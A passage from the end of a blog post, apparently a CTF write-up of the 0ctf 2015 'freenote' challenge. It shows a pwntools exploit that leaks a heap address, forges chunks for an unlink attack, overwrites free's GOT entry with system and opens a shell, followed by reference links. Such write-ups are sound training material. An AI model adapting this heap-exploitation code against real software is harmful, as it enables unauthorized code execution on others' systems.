leak <span style="color:#f92672">=</span> p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)

<span style="color:#66d9ef">print</span> leak[<span style="color:#ae81ff">0</span>:<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]<span style="color:#f92672">.</span>encode(<span style="color:#e6db74">&#39;hex&#39;</span>)
leakheapaddr <span style="color:#f92672">=</span> u64(leak[<span style="color:#ae81ff">0</span>:<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">8</span>, <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>))

<span style="color:#66d9ef">print</span> <span style="color:#e6db74">&#34;leakheapaddr: &#34;</span><span style="color:#f92672">+</span>hex(leakheapaddr)

<span style="color:#75715e">#raw_input()</span>
delete_note(<span style="color:#ae81ff">0</span>)
delete_note(<span style="color:#ae81ff">1</span>)
delete_note(<span style="color:#ae81ff">3</span>)

<span style="color:#75715e">####################unlink exp#########################</span>

notelen <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x80</span>

new_note(<span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span>notelen)
new_note(<span style="color:#e6db74">&#34;B&#34;</span><span style="color:#f92672">*</span>notelen)
new_note(<span style="color:#e6db74">&#34;C&#34;</span><span style="color:#f92672">*</span>notelen)

delete_note(<span style="color:#ae81ff">2</span>)
delete_note(<span style="color:#ae81ff">1</span>)
delete_note(<span style="color:#ae81ff">0</span>)

fd <span style="color:#f92672">=</span> leakheapaddr <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x1808</span>
bk <span style="color:#f92672">=</span> fd <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x8</span>


<span style="color:#75715e">#gdb.attach(p)</span>

payload  <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0x0</span>) <span style="color:#f92672">+</span> p64(notelen<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>) <span style="color:#f92672">+</span> p64(fd) <span style="color:#f92672">+</span> p64(bk) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;A&#34;</span> <span style="color:#f92672">*</span> (notelen <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x20</span>)
payload <span style="color:#f92672">+=</span> p64(notelen) <span style="color:#f92672">+</span> p64(notelen<span style="color:#f92672">+</span><span style="color:#ae81ff">0x10</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;A&#34;</span> <span style="color:#f92672">*</span> notelen
payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0</span>) <span style="color:#f92672">+</span> p64(notelen<span style="color:#f92672">+</span><span style="color:#ae81ff">0x11</span>)<span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">*</span> (notelen<span style="color:#f92672">-</span><span style="color:#ae81ff">0x20</span>)

new_note(payload)

delete_note(<span style="color:#ae81ff">1</span>)

free_got <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x602018</span>

payload2 <span style="color:#f92672">=</span> p64(notelen) <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">1</span>) <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0x8</span>) <span style="color:#f92672">+</span> p64(free_got) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">16</span> <span style="color:#f92672">+</span> p64(binsh_addr)
payload2 <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span> (notelen<span style="color:#f92672">*</span><span style="color:#ae81ff">3</span><span style="color:#f92672">-</span>len(payload2)) 

edit_note(<span style="color:#ae81ff">0</span>, payload2)
edit_note(<span style="color:#ae81ff">0</span>, p64(system_sh_addr))

delete_note(<span style="color:#ae81ff">1</span>)

p<span style="color:#f92672">.</span>interactive()

</code></pre></div><h3 id="参考资料">参考资料</h3>
<p><a href="http://angelboy.logdown.com/posts/259180-0ctf-2015-write-up">http://angelboy.logdown.com/posts/259180-0ctf-2015-write-up</a>
<a href="https://blog.csdn.net/qq_33528164/article/details/80085926">https://blog.csdn.net/qq_33528164/article/details/80085926</a>
<a href="https://kitctf.de/writeups/0ctf2015/freenote">https://kitctf.de/writeups/0ctf2015/freenote</a></p>
</div>
	<script>
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		function mashiroToc(mashiro) {
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    if (mashiro) {
        var id = 1;
        $(".post-content").children("h1,h2,h3,h4,h5").each(function() {
            
            var hyphenated = "mm-" + id;
            $(this).attr('id', hyphenated);
            id++;
        });
        
        tocbot.init({
            tocSelector: '.toc',
            contentSelector: '.post-content',
            headingSelector: 'h1, h2, h3, h4, h5',
            positionFixedSelector: ".toc",
            scrollEndCallback: function (e) {
                window.scrollTo(window.scrollX, window.scrollY - 80);
            },
        });
    }
}
	mashiroToc(true);
	</script>
	
</article></main>
<footer class="footer">
	<span>
		Copyright © 2020–2020, Yuuoniy and the Hugo Authors; all rights reserved.
		
	</span>
	<span>&middot;</span>
	<span>Powered by <a href="https://gohugo.io/" rel="noopener" target="_blank">Hugo️️</a>️ and <a href="https://gitlab.com/hugo-plains/hugo-plains" rel="noopener" target="_blank">Plains</a></span>
</footer>
<script src="https://yuuoniy.github.io/highlight.min.js"></script>
<script>
	hljs.initHighlightingOnLoad();
</script>
</body>
</html>
